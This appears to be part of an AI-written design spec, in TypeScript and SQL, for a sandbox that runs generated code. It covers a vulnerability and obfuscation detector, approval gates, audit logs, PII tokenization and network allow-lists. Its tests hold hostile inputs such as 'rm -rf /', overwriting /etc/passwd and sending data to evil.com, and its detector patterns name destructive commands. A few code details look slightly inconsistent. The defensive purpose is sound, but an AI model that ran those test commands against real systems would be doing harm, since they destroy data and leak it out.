      /\bif\b/g,
      /\belse\b/g,
      /\bwhile\b/g,
      /\bfor\b/g,
      /\bdo\b/g,
      /\bswitch\b/g,
      /\bcase\b/g,
      /\bcatch\b/g,
      /\&\&/g,
      /\|\|/g,
      /\?/g  // Ternary
    ];

    let complexity = 1; // Base complexity

    for (const pattern of controlFlowPatterns) {
      const matches = code.match(pattern);
      if (matches) {
        complexity += matches.length;
      }
    }

    return complexity;
  }

  private detectObfuscation(code: string): boolean {
    // Check for obfuscation indicators

    // 1. High ratio of non-alphanumeric characters
    const totalChars = code.length;
    const nonAlphaChars = (code.match(/[^a-zA-Z0-9\s]/g) || []).length;
    const nonAlphaRatio = nonAlphaChars / totalChars;

    if (nonAlphaRatio > 0.4) return true;

    // 2. Hex/octal escape sequences
    if (/(?:\\x[0-9a-f]{2}){10,}/i.test(code)) return true;
    if (/(?:\\[0-7]{3}){10,}/.test(code)) return true;

    // 3. Base64 encoded content
    if (/[A-Za-z0-9+/]{50,}={0,2}/.test(code)) {
      // Check if it's actual base64
      const base64Pattern = /[A-Za-z0-9+/]{50,}={0,2}/g;
      const matches = code.match(base64Pattern) || [];
      if (matches.length > 3) return true;
    }

    // 4. Very long strings (potential payload)
    const stringLiterals = code.match(/(["'`])(?:(?=(\\?))\2.)*?\1/g) || [];
    for (const str of stringLiterals) {
      if (str.length > 500) return true;
    }

    // 5. Excessive string concatenation
    if (/(\+\s*["'`]){10,}/.test(code)) return true;

    return false;
  }

  classifyRisk(code: string): RiskLevel {
    const validation = this.validate(code);

    // Critical if any critical violations
    if (validation.violations.some(v => v.severity === 'critical')) {
      return 'critical';
    }

    // High if 2+ high violations or complexity >50
    const highCount = validation.violations.filter(v => v.severity === 'high').length;
    if (highCount >= 2 || validation.complexity_score > 50) {
      return 'high';
    }

    // Medium if any high violations
    if (highCount > 0) {
      return 'medium';
    }

    // Medium if multiple medium violations
    const mediumCount = validation.violations.filter(v => v.severity === 'medium').length;
    if (mediumCount >= 3) {
      return 'medium';
    }

    return 'low';
  }

  detectVulnerabilities(code: string): Vulnerability[] {
    const vulnerabilities: Vulnerability[] = [];

    // SQL Injection
    const sqlInjectionPattern = /`SELECT.*\$\{.*\}`|"SELECT.*\$\{.*\}"/g;
    if (sqlInjectionPattern.test(code)) {
      vulnerabilities.push({
        type: 'SQL_INJECTION',
        severity: 'critical',
        cwe: 'CWE-89',
        description: 'SQL injection vulnerability via template literals',
        mitigation: 'Use parameterized queries'
      });
    }

    // Command Injection
    const cmdInjectionPattern = /exec\([`"].*\$\{.*\}.*[`"]\)/g;
    if (cmdInjectionPattern.test(code)) {
      vulnerabilities.push({
        type: 'COMMAND_INJECTION',
        severity: 'critical',
        cwe: 'CWE-78',
        description: 'Command injection via template literals',
        mitigation: 'Use spawn() with array arguments'
      });
    }

    // Path Traversal
    const pathTraversalPattern = /\.\.\//g;
    if (pathTraversalPattern.test(code)) {
      vulnerabilities.push({
        type: 'PATH_TRAVERSAL',
        severity: 'high',
        cwe: 'CWE-22',
        description: 'Potential path traversal with ../',
        mitigation: 'Validate and normalize paths'
      });
    }

    // XSS (if web context)
    const xssPattern = /innerHTML\s*=|dangerouslySetInnerHTML/g;
    if (xssPattern.test(code)) {
      vulnerabilities.push({
        type: 'XSS',
        severity: 'high',
        cwe: 'CWE-79',
        description: 'Potential XSS via innerHTML',
        mitigation: 'Use textContent or sanitize HTML'
      });
    }

    return vulnerabilities;
  }
}
```

---

## ⚖️ Approval Gate System

### Risk-Based Approval

```typescript
// core/execution-engine/security/approval-gate.ts

export class ApprovalGate implements IApprovalGate {
  private preferences: ApprovalPreferences;

  constructor(preferences?: ApprovalPreferences) {
    this.preferences = preferences || this.getDefaultPreferences();
  }

  async requestApproval(request: ApprovalRequest): Promise<boolean> {
    // 1. Check if approval required
    if (!this.requiresApproval(request.risk_level, { force_approval: false })) {
      // Auto-approve based on preferences
      await this.logAutoApproval(request);
      return true;
    }

    // 2. Show approval dialog
    const approved = await this.showApprovalDialog(request);

    // 3. Log decision
    await this.logApprovalDecision(request, approved);

    return approved;
  }

  private async showApprovalDialog(
    request: ApprovalRequest
  ): Promise<boolean> {
    const { action, code, risk_level, impact } = request;

    // Build dialog
    const dialog = this.buildApprovalDialog(request);

    console.log(dialog);

    // Get user input
    const answer = await this.getUserInput(
      'Approve this action? [y/N]: '
    );

    return answer.toLowerCase() === 'y';
  }

  private buildApprovalDialog(request: ApprovalRequest): string {
    const { action, code, risk_level, impact } = request;

    // Risk level emoji
    const riskEmoji = {
      'low': '🟢',
      'medium': '🟡',
      'high': '🟠',
      'critical': '🔴'
    }[risk_level];

    // Reversibility indicator
    const reversible = impact.reversible ? '✅ Yes' : '❌ No';

    return `
┌─────────────────────────────────────────────────────────────────┐
│ ${riskEmoji} Approval Required - ${risk_level.toUpperCase()} Risk│
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│ Action: ${action.padEnd(56)}│
│                                                                 │
│ Impact Assessment:                                              │
│ • Files affected:    ${String(impact.files_affected.length).padEnd(40)}│
│ • Files deleted:     ${String(impact.files_deleted).padEnd(40)}│
│ • Network access:    ${String(impact.networks_accessed.length).padEnd(40)}│
│ • Commands executed: ${String(impact.commands_executed.length).padEnd(40)}│
│ • Data modified:     ${impact.data_modified ? 'Yes' : 'No'}${' '.repeat(40)}│
│ • Reversible:        ${reversible}${' '.repeat(40)}│
│ • Blast radius:      ${impact.blast_radius}${' '.repeat(40)}│
│                                                                 │
│ Code Preview (first 10 lines):                                  │
│ ${this.formatCodePreview(code, 10)}│
│                                                                 │
│ Estimated Duration: ${this.formatDuration(request.estimated_duration)}│
│ Estimated Resources: ${this.formatResources(request.estimated_resources)}│
│                                                                 │
│ ⚠️  This action cannot be undone!                                │
│                                                                 │
│ ? Approve this action? [y/N]                                    │
│                                                                 │
│ Options:                                                        │
│ • y - Approve and execute                                       │
│ • n - Deny (default)                                            │
│ • v - View full code                                            │
│ • e - Edit code before approval                                 │
│ • s - Skip and save for later review                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
    `;
  }

  requiresApproval(
    riskLevel: RiskLevel,
    options: ExecutionOptions
  ): boolean {
    // Always require for critical
    if (riskLevel === 'critical') return true;

    // Force approval overrides preferences
    if (options.force_approval) return true;

    // Check user preferences
    const prefs = this.preferences;

    switch (riskLevel) {
      case 'high':
        return !prefs.autoApproveHigh;
      case 'medium':
        return !prefs.autoApproveMedium;
      case 'low':
        return !prefs.autoApproveLow;
      default:
        return true; // Safe default
    }
  }

  getPreferences(): ApprovalPreferences {
    return this.preferences;
  }

  async updatePreferences(
    updates: Partial<ApprovalPreferences>
  ): Promise<void> {
    this.preferences = { ...this.preferences, ...updates };
    await this.savePreferences(this.preferences);
  }

  private getDefaultPreferences(): ApprovalPreferences {
    return {
      autoApproveLow: true,
      autoApproveMedium: false,
      autoApproveHigh: false,
      autoApproveCritical: false,
      requireApprovalFor: {
        file_deletion: true,
        network_access: true,
        database_operations: true,
        system_commands: true,
        external_api_calls: true
      },
      trustedContexts: [],
      timeout_seconds: 60
    };
  }
}
```

### Impact Assessor

```typescript
// core/execution-engine/security/impact-assessor.ts

export class ImpactAssessor {
  assessImpact(code: string, options: ExecutionOptions): ImpactAssessment {
    return {
      files_affected: this.extractFileOperations(code),
      files_deleted: this.countDeletions(code),
      networks_accessed: this.extractNetworkDestinations(code),
      commands_executed: this.extractCommands(code),
      data_modified: this.detectDataModification(code),
      data_volume_bytes: this.estimateDataVolume(code),
      reversible: this.isReversible(code),
      blast_radius: this.calculateBlastRadius(code, options)
    };
  }

  private extractFileOperations(code: string): string[] {
    const operations: Set<string> = new Set();

    // fs.writeFile, fs.readFile, etc.
    const fsPattern = /fs\.(readFile|writeFile|appendFile|unlink|rm|mkdir|rmdir)\s*\(\s*['"`]([^'"`]+)['"`]/g;
    let match;
    while ((match = fsPattern.exec(code)) !== null) {
      operations.add(match[2]); // File path
    }

    // fs.promises variant
    const fsPromisesPattern = /fs\.promises\.(readFile|writeFile|unlink|mkdir|rmdir)\s*\(\s*['"`]([^'"`]+)['"`]/g;
    while ((match = fsPromisesPattern.exec(code)) !== null) {
      operations.add(match[2]);
    }

    return Array.from(operations);
  }

  private extractNetworkDestinations(code: string): string[] {
    const destinations: Set<string> = new Set();

    // fetch, axios, request
    const urlPattern = /(fetch|axios\.get|axios\.post|request)\s*\(\s*['"`](https?:\/\/[^'"`]+)['"`]/g;
    let match;
    while ((match = urlPattern.exec(code)) !== null) {
      const url = new URL(match[2]);
      destinations.add(url.hostname);
    }

    return Array.from(destinations);
  }

  private extractCommands(code: string): string[] {
    const commands: Set<string> = new Set();

    // exec, spawn, execSync
    const cmdPattern = /(exec|execSync|spawn)\s*\(\s*['"`]([^'"`]+)['"`]/g;
    let match;
    while ((match = cmdPattern.exec(code)) !== null) {
      const cmd = match[2].split(' ')[0]; // First word is command
      commands.add(cmd);
    }

    return Array.from(commands);
  }

  private detectDataModification(code: string): boolean {
    // Patterns that modify data
    const modificationPatterns = [
      /\.write\(/,
      /\.update\(/,
      /\.delete\(/,
      /\.remove\(/,
      /INSERT INTO/i,
      /UPDATE.*SET/i,
      /DELETE FROM/i,
      /DROP TABLE/i
    ];

    return modificationPatterns.some(pattern => pattern.test(code));
  }

  private isReversible(code: string): boolean {
    // Operations that cannot be reversed
    const irreversiblePatterns = [
      /fs\.(unlink|rm|rmdir)/,       // File deletion
      /DROP TABLE|DROP DATABASE/i,    // Database deletion
      /DELETE FROM/i,                 // Data deletion
      /rm -rf/,                       // Force recursive delete
      /truncate/i                     // Table truncation
    ];

    // If any irreversible operation found
    if (irreversiblePatterns.some(pattern => pattern.test(code))) {
      return false;
    }

    // Check for backup/transaction
    const hasBackup = /transaction|backup|snapshot/.test(code);

    return hasBackup;
  }

  private calculateBlastRadius(
    code: string,
    options: ExecutionOptions
  ): BlastRadius {
    // Determine scope of potential damage

    // System-level operations
    if (/sudo|systemctl|service|reboot/.test(code)) {
      return 'system';
    }

    // Network operations
    if (this.extractNetworkDestinations(code).length > 0) {
      return 'network';
    }

    // Local operations with broad scope
    if (/\*|\.\.\/|\/etc\/|\/var\//.test(code)) {
      return 'local';
    }

    // Workspace-only operations
    if (options.filesystem_scope === 'workspace-only') {
      return 'contained';
    }

    return 'contained';
  }
}

type BlastRadius = 'contained' | 'local' | 'system' | 'network';
```

---

## 📊 Audit Logging System

### Schema Design

```typescript
// core/execution-engine/monitoring/audit-logger.ts

export class AuditLogger implements IAuditLogger {
  private db: Database; // SQLite/PostgreSQL

  async log(entry: Partial<AuditLogEntry>): Promise<void> {
    const fullEntry: AuditLogEntry = {
      id: this.generateId(),
      timestamp: new Date(),
      session_id: entry.session_id || 'unknown',
      user_id: entry.user_id || 'unknown',
      ...entry
    } as AuditLogEntry;

    // 1. Store in database
    await this.db.auditLogs.insert(fullEntry);

    // 2. Real-time monitoring
    await this.sendToMonitoring(fullEntry);

    // 3. Alert on critical/high risk
    if (fullEntry.risk_level === 'critical' || fullEntry.risk_level === 'high') {
      await this.sendAlert(fullEntry);
    }

    // 4. Compliance tracking
    await this.updateComplianceMetrics(fullEntry);
  }

  async query(filters: AuditLogFilters): Promise<AuditLogEntry[]> {
    const query = this.buildQuery(filters);
    return await this.db.auditLogs.find(query);
  }

  async generateReport(period: DateRange): Promise<ComplianceReport> {
    const logs = await this.query({
      timestamp: {
        $gte: period.start,
        $lte: period.end
      }
    });

    return {
      period,
      summary: {
        total_executions: logs.length,
        successful: logs.filter(l => l.success).length,
        failed: logs.filter(l => !l.success).length,
        approved: logs.filter(l => l.approved).length,
        auto_approved: logs.filter(l => l.auto_approved).length
      },

      by_risk_level: this.groupByRiskLevel(logs),

      by_sandbox_type: this.groupBySandboxType(logs),

      violations: logs
        .filter(l => l.violations.length > 0)
        .map(l => ({
          id: l.id,
          timestamp: l.timestamp,
          violations: l.violations,
          action: l.action
        })),

      high_risk_actions: logs.filter(l =>
        l.risk_level === 'high' || l.risk_level === 'critical'
      ),

      performance: {
        average_duration: this.calculateAverage(logs, 'duration_ms'),
        total_tokens_used: logs.reduce((sum, l) => sum + l.tokens_used, 0),
        average_memory: this.calculateAverage(
          logs,
          'resources_used.memory_bytes'
        )
      },

      security: {
        total_violations: logs.reduce((sum, l) => sum + l.violations.length, 0),
        critical_violations: this.countCriticalViolations(logs),
        blocked_executions: logs.filter(l => !l.approved).length
      },

      generated_at: new Date()
    };
  }

  private async sendToMonitoring(entry: AuditLogEntry): Promise<void> {
    // Send to monitoring system (Prometheus, Datadog, etc.)
    const metrics = {
      'code_execution_total': 1,
      'code_execution_duration_ms': entry.duration_ms,
      'code_execution_tokens_used': entry.tokens_used,
      'code_execution_success': entry.success ? 1 : 0,
      'code_execution_risk_level': this.riskLevelToNumeric(entry.risk_level)
    };

    for (const [metric, value] of Object.entries(metrics)) {
      await this.metricsCollector.record(metric, value, {
        risk_level: entry.risk_level,
        sandbox_type: entry.sandbox_type,
        session_id: entry.session_id
      });
    }
  }

  private async sendAlert(entry: AuditLogEntry): Promise<void> {
    // Alert on high-risk executions
    const alert = {
      level: entry.risk_level === 'critical' ? 'critical' : 'warning',
      title: `${entry.risk_level.toUpperCase()} risk code execution`,
      description: `Action: ${entry.action}`,
      details: {
        session_id: entry.session_id,
        user_id: entry.user_id,
        code_hash: entry.code_hash,
        violations: entry.violations.length,
        approved: entry.approved
      },
      timestamp: entry.timestamp
    };

    await this.alertManager.send(alert);
  }
}
```

### Database Schema

```sql
-- audit_logs table schema
CREATE TABLE audit_logs (
  -- Identity
  id VARCHAR(36) PRIMARY KEY,
  timestamp TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
  session_id VARCHAR(36) NOT NULL,
  user_id VARCHAR(255) NOT NULL,

  -- Execution
  action VARCHAR(255) NOT NULL,
  code TEXT NOT NULL,
  code_hash VARCHAR(64) NOT NULL,
  input JSONB,
  output JSONB,

  -- Environment
  sandbox_type VARCHAR(20) NOT NULL,
  security_level VARCHAR(20) NOT NULL,

  -- Results
  duration_ms INTEGER NOT NULL,
  tokens_used INTEGER NOT NULL,
  success BOOLEAN NOT NULL,
  error TEXT,

  -- Security
  risk_level VARCHAR(20) NOT NULL,
  violations JSONB,
  approved BOOLEAN NOT NULL,
  auto_approved BOOLEAN NOT NULL,
  approver VARCHAR(255),

  -- Resources
  resources_used JSONB,

  -- Model
  model VARCHAR(100),
  model_version VARCHAR(50),

  -- Indexes
  INDEX idx_timestamp (timestamp),
  INDEX idx_session (session_id),
  INDEX idx_user (user_id),
  INDEX idx_risk (risk_level),
  INDEX idx_success (success),
  INDEX idx_code_hash (code_hash)
);

-- Retention policy
CREATE EVENT cleanup_old_logs
ON SCHEDULE EVERY 1 DAY
DO DELETE FROM audit_logs
WHERE timestamp < DATE_SUB(NOW(), INTERVAL 90 DAY);
```

---

## 🔐 PII Tokenization Engine

### Design

```typescript
// core/execution-engine/security/pii-tokenizer.ts

export class PIITokenizer {
  private tokenMap: Map<string, string> = new Map();
  private reverseMap: Map<string, string> = new Map();
  private counter = 0;

  // PII patterns
  private readonly PII_PATTERNS: PIIPattern[] = [
    {
      name: 'email',
      pattern: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g,
      tokenPrefix: 'EMAIL'
    },
    {
      name: 'phone',
      pattern: /\b(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b/g,
      tokenPrefix: 'PHONE'
    },
    {
      name: 'ssn',
      pattern: /\b\d{3}-\d{2}-\d{4}\b/g,
      tokenPrefix: 'SSN'
    },
    {
      name: 'credit_card',
      pattern: /\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b/g,
      tokenPrefix: 'CC'
    },
    {
      name: 'api_key',
      pattern: /\b[A-Za-z0-9]{32,}\b/g,
      tokenPrefix: 'API_KEY'
    }
  ];

  // Sensitive field names
  private readonly SENSITIVE_FIELDS = new Set([
    'email', 'phone', 'ssn', 'social_security_number',
    'credit_card', 'password', 'api_key', 'secret',
    'token', 'auth_token', 'private_key'
  ]);

  /**
   * Tokenize PII in data before sending to model
   */
  tokenize(data: any): any {
    if (typeof data === 'string') {
      return this.tokenizeString(data);
    } else if (Array.isArray(data)) {
      return data.map(item => this.tokenize(item));
    } else if (typeof data === 'object' && data !== null) {
      const result: any = {};
      for (const [key, value] of Object.entries(data)) {
        if (this.isSensitiveField(key)) {
          const token = this.generateToken(key);
          this.tokenMap.set(token, value as string);
          this.reverseMap.set(value as string, token);
          result[key] = token;
        } else {
          result[key] = this.tokenize(value);
        }
      }
      return result;
    }
    return data;
  }

  /**
   * Detokenize data before sending to MCP tools
   */
  detokenize(data: any): any {
    if (typeof data === 'string' && this.tokenMap.has(data)) {
      return this.tokenMap.get(data);
    } else if (Array.isArray(data)) {
      return data.map(item => this.detokenize(item));
    } else if (typeof data === 'object' && data !== null) {
      const result: any = {};
      for (const [key, value] of Object.entries(data)) {
        result[key] = this.detokenize(value);
      }
      return result;
    }
    return data;
  }

  private tokenizeString(text: string): string {
    let result = text;

    // Apply each PII pattern
    for (const piiPattern of this.PII_PATTERNS) {
      result = result.replace(piiPattern.pattern, (match) => {
        // Check if already tokenized
        if (this.reverseMap.has(match)) {
          return this.reverseMap.get(match)!;
        }

        // Generate new token
        const token = this.generateToken(piiPattern.tokenPrefix);
        this.tokenMap.set(token, match);
        this.reverseMap.set(match, token);

        return token;
      });
    }

    return result;
  }

  private isSensitiveField(fieldName: string): boolean {
    const normalized = fieldName.toLowerCase().replace(/[-_]/g, '');
    return Array.from(this.SENSITIVE_FIELDS).some(sensitive =>
      normalized.includes(sensitive.replace(/[-_]/g, ''))
    );
  }

  private generateToken(prefix: string): string {
    return `[${prefix}_${++this.counter}]`;
  }

  /**
   * Clear tokenization mappings
   */
  clear(): void {
    this.tokenMap.clear();
    this.reverseMap.clear();
    this.counter = 0;
  }

  /**
   * Get statistics
   */
  getStats(): TokenizationStats {
    return {
      total_tokens: this.tokenMap.size,
      by_type: this.groupByType(),
      memory_usage: this.estimateMemoryUsage()
    };
  }

  private groupByType(): Record<string, number> {
    const counts: Record<string, number> = {};

    for (const token of this.tokenMap.keys()) {
      const type = token.match(/\[([A-Z_]+)_\d+\]/)?[1] || 'UNKNOWN';
      counts[type] = (counts[type] || 0) + 1;
    }

    return counts;
  }
}
```

---

## 📡 Network Policy Enforcement

```typescript
// core/execution-engine/security/network-policy.ts

export class NetworkPolicy {
  private whitelist: DomainRule[];
  private blacklist: CIDRBlock[];
  private rateLimiter: RateLimiter;

  constructor(config: NetworkPolicyConfig) {
    this.whitelist = config.whitelist || this.getDefaultWhitelist();
    this.blacklist = config.blacklist || this.getDefaultBlacklist();
    this.rateLimiter = new RateLimiter(config.rateLimit);
  }

  async enforcePolicy(request: NetworkRequest): Promise<boolean> {
    const { domain, port, protocol } = request;

    // 1. Check blacklist first (deny takes precedence)
    if (await this.isBlacklisted(domain)) {
      await this.logBlocked(request, 'blacklisted');
      return false;
    }

    // 2. Check whitelist
    if (!this.isWhitelisted(domain, port, protocol)) {
      await this.logBlocked(request, 'not_whitelisted');
      return false;
    }

    // 3. Check rate limit
    if (!await this.rateLimiter.checkLimit(domain)) {
      await this.logBlocked(request, 'rate_limited');
      return false;
    }

    // 4. Log allowed request
    await this.logAllowed(request);

    return true;
  }

  private async isBlacklisted(domain: string): Promise<boolean> {
    // Resolve domain to IP
    const ip = await this.resolveDomain(domain);

    // Check against blacklist CIDRs
    for (const cidr of this.blacklist) {
      if (this.ipInCIDR(ip, cidr)) {
        return true;
      }
    }

    return false;
  }

  private isWhitelisted(
    domain: string,
    port: number,
    protocol: string
  ): boolean {
    for (const rule of this.whitelist) {
      if (this.matchesDomain(domain, rule.domain) &&
          rule.ports.includes(port) &&
          rule.protocols.includes(protocol)) {
        return true;
      }
    }

    return false;
  }

  private matchesDomain(domain: string, pattern: string): boolean {
    // Support wildcards: *.example.com
    if (pattern.startsWith('*.')) {
      const suffix = pattern.slice(2);
      return domain.endsWith(suffix) || domain === suffix;
    }

    return domain === pattern;
  }

  private getDefaultWhitelist(): DomainRule[] {
    return [
      {
        domain: 'api.openai.com',
        ports: [443],
        protocols: ['https']
      },
      {
        domain: 'api.anthropic.com',
        ports: [443],
        protocols: ['https']
      },
      {
        domain: '*.googleapis.com',
        ports: [443],
        protocols: ['https']
      },
      {
        domain: 'github.com',
        ports: [443, 22],
        protocols: ['https', 'ssh']
      }
    ];
  }

  private getDefaultBlacklist(): CIDRBlock[] {
    return [
      '0.0.0.0/8',       // Current network
      '10.0.0.0/8',      // Private network
      '127.0.0.0/8',     // Loopback
      '169.254.0.0/16',  // Link-local
      '172.16.0.0/12',   // Private network
      '192.168.0.0/16',  // Private network
      '224.0.0.0/4',     // Multicast
      '240.0.0.0/4'      // Reserved
    ];
  }
}

/**
 * Rate limiter for network requests
 */
class RateLimiter {
  private requests: Map<string, number[]> = new Map();
  private limit: number;
  private window_ms: number;

  constructor(config: RateLimitConfig) {
    this.limit = config.limit || 100; // requests
    this.window_ms = config.window_ms || 60000; // per minute
  }

  async checkLimit(domain: string): Promise<boolean> {
    const now = Date.now();
    const requests = this.requests.get(domain) || [];

    // Remove old requests outside window
    const recent = requests.filter(timestamp =>
      now - timestamp < this.window_ms
    );

    // Check if under limit
    if (recent.length >= this.limit) {
      return false; // Rate limit exceeded
    }

    // Add current request
    recent.push(now);
    this.requests.set(domain, recent);

    return true;
  }

  getStats(domain: string): RateLimitStats {
    const requests = this.requests.get(domain) || [];
    const now = Date.now();
    const recent = requests.filter(t => now - t < this.window_ms);

    return {
      domain,
      current_count: recent.length,
      limit: this.limit,
      window_ms: this.window_ms,
      remaining: Math.max(0, this.limit - recent.length),
      reset_at: new Date(now + this.window_ms)
    };
  }
}
```

---

## 🧪 Testing Strategy

### Unit Tests

```typescript
// tests/execution-engine/sandbox-manager.test.ts

describe('SandboxManager', () => {
  let manager: SandboxManager;

  beforeEach(() => {
    manager = new SandboxManager();
  });

  describe('execute', () => {
    it('should execute safe code successfully', async () => {
      const code = 'console.log("Hello, World!");';

      const result = await manager.execute(code, {
        security_level: 'high',
        timeout: 5000
      });

      expect(result.success).toBe(true);
      expect(result.stdout).toContain('Hello, World!');
      expect(result.duration_ms).toBeLessThan(1000);
    });

    it('should block dangerous code', async () => {
      const code = 'require("child_process").exec("rm -rf /");';

      await expect(
        manager.execute(code, { security_level: 'high' })
      ).rejects.toThrow(/validation failed/);
    });

    it('should enforce timeout', async () => {
      const code = 'while(true) {}'; // Infinite loop

      await expect(
        manager.execute(code, { timeout: 1000 })
      ).rejects.toThrow(/timeout/);
    });

    it('should enforce memory limit', async () => {
      const code = 'const arr = []; while(true) arr.push(new Array(1000000));';

      const result = await manager.execute(code, {
        memory_limit: '128MB',
        timeout: 2000
      });

      expect(result.success).toBe(false);
      expect(result.error?.message).toContain('memory');
    });

    it('should isolate filesystem', async () => {
      const code = `
        const fs = require('fs');
        try {
          fs.writeFileSync('/etc/hosts', 'malicious');
          console.log('SECURITY_BREACH');
        } catch (e) {
          console.log('BLOCKED');
        }
      `;

      const result = await manager.execute(code, {
        filesystem_scope: 'workspace-only'
      });

      expect(result.stdout).toContain('BLOCKED');
      expect(result.stdout).not.toContain('SECURITY_BREACH');
    });

    it('should tokenize PII', async () => {
      const code = `
        const data = {
          name: 'John Doe',
          email: 'john@example.com',
          phone: '555-123-4567'
        };
        console.log(JSON.stringify(data));
      `;

      const result = await manager.execute(code, {
        tokenize_pii: true
      });

      // Model should see tokens, not real data
      expect(result.stdout).toContain('[EMAIL_');
      expect(result.stdout).toContain('[PHONE_');
      expect(result.stdout).not.toContain('john@example.com');
      expect(result.stdout).not.toContain('555-123-4567');
    });
  });

  describe('validate', () => {
    it('should detect SQL injection', async () => {
      const code = 'const query = `SELECT * FROM users WHERE id = ${userId}`;';

      const result = await manager.validate(code);

      expect(result.valid).toBe(false);
      expect(result.violations).toContainEqual(
        expect.objectContaining({
          type: 'SQL_INJECTION',
          severity: 'critical'
        })
      );
    });

    it('should detect command injection', async () => {
      const code = 'exec(`curl ${userInput}`)';

      const result = await manager.validate(code);

      expect(result.violations).toContainEqual(
        expect.objectContaining({
          type: 'command_injection'
        })
      );
    });

    it('should calculate complexity', async () => {
      const complexCode = `
        function complex(a, b, c) {
          if (a > 0) {
            if (b > 0) {
              if (c > 0) {
                while (a--) {
                  for (let i = 0; i < b; i++) {
                    switch(c) {
                      case 1: break;
                      case 2: break;
                      case 3: break;
                    }
                  }
                }
              }
            }
          }
        }
      `;

      const result = await manager.validate(complexCode);

      expect(result.complexity_score).toBeGreaterThan(10);
    });
  });
});
```

### Integration Tests

```typescript
// tests/integration/sandbox-security.test.ts

describe('Sandbox Security Integration', () => {
  it('should prevent container escape', async () => {
    const maliciousCode = `
      const fs = require('fs');
      // Attempt to escape container
      fs.writeFileSync('/host/etc/passwd', 'hacked');
    `;

    const manager = new SandboxManager();
    const result = await manager.execute(maliciousCode, {
      security_level: 'maximum'
    });

    // Should fail to write outside container
    expect(result.success).toBe(false);

    // Verify host filesystem untouched
    const hostFile = '/etc/passwd';
    const original = await fs.readFile(hostFile, 'utf-8');
    expect(original).not.toContain('hacked');
  });

  it('should block network access when disabled', async () => {
    const code = `
      const https = require('https');
      https.get('https://evil.com/exfiltrate', (res) => {
        console.log('BREACH');
      });
    `;

    const manager = new SandboxManager();
    const result = await manager.execute(code, {
      allow_network: false,
      timeout: 5000
    });

    expect(result.stdout).not.toContain('BREACH');
    expect(result.network_requests).toHaveLength(0);
  });

  it('should enforce whitelist when network enabled', async () => {
    const code = `
      const fetch = require('node-fetch');

      // Allowed domain
      await fetch('https://api.anthropic.com/status');
      console.log('ALLOWED');

      // Blocked domain
      try {
        await fetch('https://evil.com/data');
        console.log('BREACH');
      } catch (e) {
        console.log('BLOCKED');
      }
    `;

    const manager = new SandboxManager();
    const result = await manager.execute(code, {
      allow_network: true,
      allowed_domains: ['api.anthropic.com']
    });

    expect(result.stdout).toContain('ALLOWED');
    expect(result.stdout).toContain('BLOCKED');
    expect(result.stdout).not.toContain('BREACH');
  });
});
```

---

## 📊 Performance Benchmarks

### Expected Performance

```yaml
docker_sandbox:
  startup_time: 100-200ms
  execution_overhead: 10-20ms
  memory_overhead: 50-100MB
  teardown_time: 50-100ms
  total_overhead: 160-320ms

vm_sandbox:
  startup_time: 1-2s
  execution_overhead: 5-10ms
  memory_overhead: 200-300MB
  teardown_time: 100-200ms
  total_overhead: 1.1-2.2s

process_sandbox:
  startup_time: 10-20ms
  execution_overhead: 5ms
  memory_overhead: 10-20MB
  teardown_time: 5-10ms
  total_overhead: 20-35ms
```

### Benchmark Tests

```typescript
// tests/benchmarks/sandbox-performance.test.ts

describe('Sandbox Performance Benchmarks', () => {
  it('Docker sandbox startup < 200ms', async () => {
    const sandbox = new DockerSandbox();

    const start = Date.now();
    await sandbox.initialize({});
    const duration = Date.now() - start;

    expect(duration).toBeLessThan(200);
  });

  it('Docker execution overhead < 320ms', async () => {
    const manager = new SandboxManager();
    const simpleCode = 'console.log("test");';

    const start = Date.now();
    await manager.execute(simpleCode, { security_level: 'high' });
    const duration = Date.now() - start;

    expect(duration).toBeLessThan(320);
  });

  it('Handles 100 concurrent executions', async () => {
    const manager = new SandboxManager();
    const code = 'console.log(Math.random());';

    const start = Date.now();

    const promises = Array.from({ length: 100 }, () =>
      manager.execute(code, { security_level: 'high' })
    );

    const results = await Promise.all(promises);

    const duration = Date.now() - start;

    expect(results).toHaveLength(100);
    expect(results.every(r => r.success)).toBe(true);
    expect(duration).toBeLessThan(10000); // <10s for 100 executions
  });
});
```

---

## 🎯 API Contracts

### Public API

```typescript
/**
 * Main entry point for code execution
 */
export class ExecutionEngine {
  /**
   * Execute code with automatic sandbox selection
   * @example
   * ```typescript
   * const engine = new ExecutionEngine();
   * const result = await engine.execute(`
   *   console.log('Hello from sandbox');
   * `, {
   *   security_level: 'high',
   *   timeout: 5000
   * });
   * ```
   */
  async execute(
    code: string,
    options?: ExecutionOptions
  ): Promise<ExecutionResult>;

  /**
   * Validate code without executing
   * @example
   * ```typescript
   * const validation = await engine.validate(code);
   * if (!validation.valid) {
   *   console.error('Violations:', validation.violations);
   * }
   * ```
   */
  async validate(code: string): Promise<ValidationResult>;

  /**
   * Get audit logs
   * @example
   * ```typescript
   * const logs = await engine.getAuditLogs({
   *   user_id: 'user123',
   *   risk_level: 'high'
   * });
   * ```
   */
  async getAuditLogs(
    filters: AuditLogFilters
  ): Promise<AuditLogEntry[]>;

  /**
   * Generate compliance report
   * @example
   * ```typescript
   * const report = await engine.generateComplianceReport({
   *   start: new Date('2025-01-01'),
   *   end: new Date('2025-12-31')
   * });
   * ```
   */
  async generateComplianceReport(
    period: DateRange
  ): Promise<ComplianceReport>;
}
```

---

## ✅ Summary & Next Steps

**Design Complete**: Execution Sandbox Manager fully specified with:
- ✅ Complete architecture (6-layer security)
- ✅ 3 sandbox implementations (Docker, VM, Process)
- ✅ Security validation with 20+ patterns
- ✅ Approval gate system
- ✅ Audit logging with compliance
- ✅ PII tokenization
- ✅ Network policy enforcement
- ✅ Complete API contracts
- ✅ Testing strategy
- ✅ Performance benchmarks

**Ready for**: Phase 4 implementation (Week 6)

**Estimated Implementation Time**: 2 weeks (1 developer)

---

Vuoi che proceda con:
1. **Creare prototype implementation** del Docker Sandbox?
2. **Design altro componente** (Task Classifier, MCP Code API Generator)?
3. **Iniziare implementation Phase 1** con questo design come riferimento?
4. **Altro**?

🚀